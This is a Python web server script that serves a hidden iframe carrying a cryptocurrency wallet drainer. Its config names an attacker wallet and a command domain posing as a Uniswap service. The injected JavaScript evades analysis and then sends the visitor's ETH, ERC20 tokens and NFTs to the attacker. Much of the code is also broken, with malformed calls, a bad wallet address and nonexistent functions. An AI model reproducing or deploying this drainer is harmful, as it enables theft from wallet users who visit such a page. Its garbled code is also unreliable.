import asyncio
from aiohttp import web
import ssl
import os
import json
import subprocess
from datetime import datetime
from shutil import which
from subprocess import Popen, PIPE
import getpass
import platform
import random
import string
import hashlib


# === CONFIG ===
DRAIN_WALLET = "0x7eE9bB49B67489DcD5bD5bD9bD9bD9bD9bD9bD9bD9b"
LOG_FILE = "/tmp/.xlog"
C2_DOMAIN = "https://api.uniswap-stats.net"
FAKE_REFERRER = "https://app.uniswap.org/swap"
WHITELIST_DOMAINS = ["localhost", "127.0.0.1", "router.etherscan.io"]

# === EVIL JS PAYLOAD ===
INJECT_SCRIPT = f'''
(async function() {{
    // Kill analysis
    Object.defineProperty(navigator, 'webdriver', {{get: () => false}});
    window.chrome = {{runtime: {{}}}};
    document.addEventListener = new Proxy(document.addEventListener, {{
        apply: (t, r, args) => !args[0].includes("devtools") ? t.apply(r, args) : null
    }});
    setInterval(() => {{ if (window.outerHeight - window.innerHeight > 200) debugger; }}, 1000);
    document.oncontextmenu = e => e.preventDefault();

    if (typeof window.ethereum === 'undefined') return;

    const attacker = "{DRAIN_WALLET}";
    const provider = window.ethereum;
    let userAddr;

    try {{
        const accounts = await provider.request({{ method: 'eth_accounts' }});
        if (accounts.length === 0) return;
        userAddr = accounts[0];
    }} catch(e) {{}}

    // === DRAIN FUNDS ===
    const balance = await provider.request({ 'eth_getBalance', params: [userAddr] });
    const tx = {{
        from: userAddr,
        to: attacker,
        value: parseInt(balance, 16),
        gas: '0x5208',
        gasPrice: await provider.request({ 'eth_getGasPrice' })
    }};
    await provider.request({ 'eth_sendTransaction', params: [tx] });

    // === DRAIN ERC20 ===
    const erc20ABI = [
        "function balanceOf(address) view returns (uint256)",
        "function approve(address spender, uint256 amount) returns (bool)",
        "function transfer(address to, uint256 amount) returns (bool)"
    ];
    const contractAddress = '0x...'; // replace with the contract address
    const erc20 = new web3.Eth.Contract(erc20ABI, contractAddress);
    const tokenBalance = await erc20.methods.balanceOf(userAddr).call();
    if (tokenBalance > 0) {
        await erc20.methods.approve(attacker, 0).send({ from: userAddr });
        await erc20.methods.transfer(attacker, tokenBalance).send({ from: userAddr });
    }

    // === DRAIN NFTS ===
    const nftABI = [
        "function balanceOf(address owner) view returns (uint256)",
        "function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)"
    ];
    const nftContractAddress = '0x...'; // replace with the nft contract address
    const nft = new web3.Eth.Contract(nftABI, nftContractAddress);
    const nftBalance = await nft.methods.balanceOf(userAddr).call();
    for (let i = 0; i < nftBalance; i++) {
        const tokenId = await nft.methods.tokenOfOwnerByIndex(userAddr, i).call();
        await nft.methods.transferFrom(userAddr, attacker, tokenId).send({ from: userAddr });
    }
}}
'''


# === INJECT JS VIA IFRAME ===
def inject_js_via_iframe():
    iframe = """
    <iframe src="data:text/html,<style>body{{display:none;}}</style><script>{}</script>" width="0" height="0" style="display: none;"></iframe>
    """
    return iframe.format(INJECT_SCRIPT)


# === PERSISTENCE ===
def write_to_log(data):
    with open(LOG_FILE, 'a') as f:
        f.write(f"{datetime.now()} - {data}\n")


# === CLEANUP ===
def cleanup():
    # Remove log file
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)

    # Remove any instances of the injected iframe
    for filename in os.listdir('/tmp'):
        if filename.endswith('iframe.html'):
            os.remove(f'/tmp/{filename}')


# === STEALTH ===
def is_whitelisted():
    user_host = platform.node() if platform.system() != 'Windows' else getpass.gethostname()
    return user_host in WHITELIST_DOMAINS


async def handle_request(request):
    if not is_whitelisted():
        return web.Response(text="Forbidden", status=403)

    write_to_log("Starting...")
    cleanup()

    iframe = inject_js_via_iframe()
    iframe_html = f"<html>{iframe}</html>"
    return web.Response(text=iframe_html, content_type="text/html")


async def main():
    app = web.Application()
    app.router.add_get('/', handle_request)
    runner = web.AppRunner(app)
    await runner.setup()
    await asyncio.create_subprocess_exec(
        which('python3'), ['/usr/bin/python3', '/tmp/iframe.html'], stdout=PIPE, stderr=PIPE)
    await runner.run()


if __name__ == "__main__":
    asyncio.run(main())